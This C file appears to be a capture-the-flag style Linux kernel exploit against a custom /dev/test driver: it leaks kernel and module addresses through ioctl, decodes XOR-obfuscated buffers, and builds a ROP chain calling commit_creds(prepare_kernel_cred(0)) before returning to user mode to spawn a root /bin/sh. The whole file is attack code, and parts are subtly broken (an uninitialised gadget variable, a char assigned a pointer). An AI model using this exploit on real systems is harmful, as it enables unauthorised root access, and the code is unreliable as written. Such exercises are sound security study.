#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <signal.h>

#define GET 0xDEADBEEF
#define ROP 0xFEEDFACE

unsigned char buf[0x1000] = {0};
int i;
size_t vmlinux_base = 0xffffffff81000000;

void getshell()  
{  
    printf("****getshell****");  
    system("id");  
    system("/bin/sh");  
} 

size_t  user_cs, user_gs, user_ds, user_es, user_ss, user_rflags, user_rsp;
void save_status()
{
    __asm__ (".intel_syntax noprefix\n");
    __asm__ volatile (
        "mov user_cs, cs;\
         mov user_ss, ss;\
         mov user_gs, gs;\
         mov user_ds, ds;\
         mov user_es, es;\
         mov user_rsp, rsp;\
         pushf;\
         pop user_rflags"
    );
    printf("[+] got user stat\n");
}


int main(){
    int fd = open("/dev/test", O_RDWR);
    strcpy(buf, "gtwYHamW4U2yQ9LQzfFJSncfHgFf5Pjc");
    for (i = 0; i < 0x20; i++)
    {
        buf[i] ^= 0xf9;
    }
    unsigned char passwd = buf;
    ioctl(fd, GET, buf);

    int j, k;
    size_t ret_addr[30] = {0};
    for(j = 0; j < 30; j++){
        for(k = 0; k < 8; k++){
            buf[0x20 + j * 8 + k] ^= 0xf9;
        }
        ret_addr[j] = *(long long*)(buf + 0x20 + j*8);
        printf("ret_addr[%d] = 0x%llx\n", j, ret_addr[j]);
    }
    size_t kernel_leak = ret_addr[21];
    size_t offset = kernel_leak - 0x32a555 - vmlinux_base;
    printf("kernel_offset = 0x%llx\n", offset);
    size_t prepare_kernel_cred = vmlinux_base + offset + 0xcfbe0;
    size_t commit_creds = vmlinux_base +offset + 0xcf720;
    printf("prepare_kernel_cred = 0x%llx\n", prepare_kernel_cred);
    printf("commit_creds = 0x%llx\n", commit_creds);

    size_t leak = *(long long*)(buf + 0x20);
    printf("module_base = 0x%llx\n", leak);
//0x0000000000000009: mov rdi, rax; ret; 
//0x0000000000000011: swapgs; ret;
//0x0000000000000015: iretq; ret;
//0x00000000000002C3: mov rax r12; pop r12; pop rbp;
    size_t mov_rdi_rax = leak + 0x9;
    size_t swapgs = leak + 0x11;
    size_t iretq = leak + 0x15;
    size_t mov_rax_r12_pop_r12_pop_rbp;

    size_t rop[0x40] = {0};
    save_status();
    signal(SIGSEGV, getshell);
    int idx = 0;
    //prepare_kernel_cred(0);
    rop[idx++] = mov_rax_r12_pop_r12_pop_rbp;
    rop[idx++] = (size_t)0x0;
    rop[idx++] = (size_t)0;
    rop[idx++] = mov_rax_r12_pop_r12_pop_rbp;
    rop[idx++] = (size_t)0x0;
    rop[idx++] = (size_t)0;
    rop[idx++] = mov_rdi_rax;
    rop[idx++] = prepare_kernel_cred;
    //commit_creds(prepare_kernel_cred(0))
    rop[idx++] = mov_rdi_rax;
    rop[idx++] = commit_creds;
    rop[idx++] = swapgs;
    rop[idx++] = iretq;
    rop[idx++] = getshell;
    rop[idx++] = user_cs;
    rop[idx++] = user_rflags;
    rop[idx++] = user_rsp;
    rop[idx++] = user_ss; 

    int payload_length = idx * 8;
    for(int l = 0; l < payload_length; l++){
        *((char*)rop + l) ^= 0xf9;
    }
    strcat(passwd, (char*)rop);
    ioctl(fd, ROP, passwd);
    close(fd);

    return 0;
}